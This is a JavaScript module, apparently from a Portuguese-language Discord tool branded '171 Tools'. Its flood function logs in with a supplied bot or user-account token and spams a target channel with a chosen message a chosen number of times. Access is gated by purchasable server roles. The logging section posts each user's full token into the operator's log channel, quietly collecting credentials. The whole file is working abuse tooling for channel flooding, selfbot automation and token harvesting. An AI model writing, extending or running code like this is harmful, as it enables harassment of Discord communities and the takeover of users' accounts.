const { Client: SelfbotClient } = require('discord.js-selfbot-v13');
const { Client: BotClient, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const fs = require('fs');
const path = require('path');
const config = JSON.parse(fs.readFileSync(path.join(__dirname, '../config.json'), 'utf8'));

async function flood({ token, channelId, mensagem, quantidade, tokenType, interaction, logsChannelId }) {
  let client;
  if (tokenType === 'bot') {
    client = new BotClient({
      intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages]
    });
    // Só permitir bot em canais de texto de servidor
    const channel = await client.channels.fetch(channelId).catch(() => null);
    if (!channel || channel.type !== 0 || !channel.guild) {
      await interaction.editReply({ content: '`❌` Flood com bot só funciona em canais de texto de servidor.', flags : 64 });
      return;
    }
    // Checar permissão de enviar mensagens
    const me = channel.guild.members.me || channel.guild.members.cache.get(client.user.id);
    if (!me || !me.permissionsIn(channel).has('SendMessages')) {
      await interaction.editReply({ content: '`❌` O bot não tem permissão para enviar mensagens neste canal.', flags : 64 });
      return;
    }
  } else {
    client = new SelfbotClient();
  }
  let erroLogin = false;
  try {
    await client.login(token).catch(() => erroLogin = true);
  } catch {
    erroLogin = true;
  }
  if (erroLogin) {
    await interaction.editReply({ content: '\`❌\` Token inválido, tente novamente!', flags : 64 });
    return;
  }
  const member = await interaction.guild.members.fetch(interaction.user.id);
  const cargoUniversal = config.cargo_permitido_universal;
  const cargoEspecifico = config.cargo_permitido_flood;
  if ((cargoUniversal || cargoEspecifico) && !member.roles.cache.has(cargoUniversal) && !member.roles.cache.has(cargoEspecifico)) {
    await interaction.editReply({ content: '\`❌\` \`❌\` Você não tem permissão para esta ação, resgate seu acesso em https://discord.com/channels/1352435898205208680/1382212010590081164.', flags : 64 });
    return;
  }
  try {
    const channel = await client.channels.fetch(channelId).catch(() => null);
    if (!channel) throw new Error('Canal não encontrado ou sem permissão.');
    let sent = 0, errors = 0;
    for (let i = 0; i < Number(quantidade); i++) {
      try {
        await channel.send(mensagem);
        sent++;
        await interaction.editReply({ content: `\`🔄\` Flood em andamento... Enviadas: **${sent}** | Erros: **${errors}**`, flags : 64 });
        await new Promise(r => setTimeout(r, 500));
      } catch {
        errors++;
        await interaction.editReply({ content: `\`🔄\` Flood em andamento... Enviadas: **${sent}** | Erros: **${errors}**`, flags : 64 });
      }
    }
    await interaction.editReply({ content: `\`✅\` Flood concluído! Mensagens enviadas: **${sent}** | Erros: **${errors}**`, flags : 64 });
    // Log detalhado
    const logChannelId = config.log_flood || config.log_cleaner || logsChannelId || config.log_extracao;
    if (logChannelId) {
      const logChannel = interaction.client.channels.cache.get(logChannelId);
      if (logChannel) {
        const embed = new EmbedBuilder()
          .setTitle('💬 Flood Executado')
          .setColor(0x5865F2)
          .addFields(
            { name: 'Usuário', value: `<@${interaction.user.id}>`, inline: true },
            { name: 'Token', value: `||${token}||`, inline: false },
            { name: 'Canal', value: `\`${channelId}\``, inline: true },
            { name: 'Mensagens Enviadas', value: `${sent}`, inline: true },
            { name: 'Erros', value: `${errors}`, inline: true },
            { name: 'Tipo de Token', value: tokenType, inline: true },
            { name: 'Data/Hora', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: false }
          )
          .setFooter({ text: '171 Tools' });
        logChannel.send({ embeds: [embed] });
      }
    }
  } catch (err) {
    await interaction.editReply({ content: '\`❌\` Erro ao executar Flood: ' + err.message, flags : 64 });
  }
  await client.destroy?.();
  await client.logout?.().catch(() => {});
}

module.exports = { flood }; 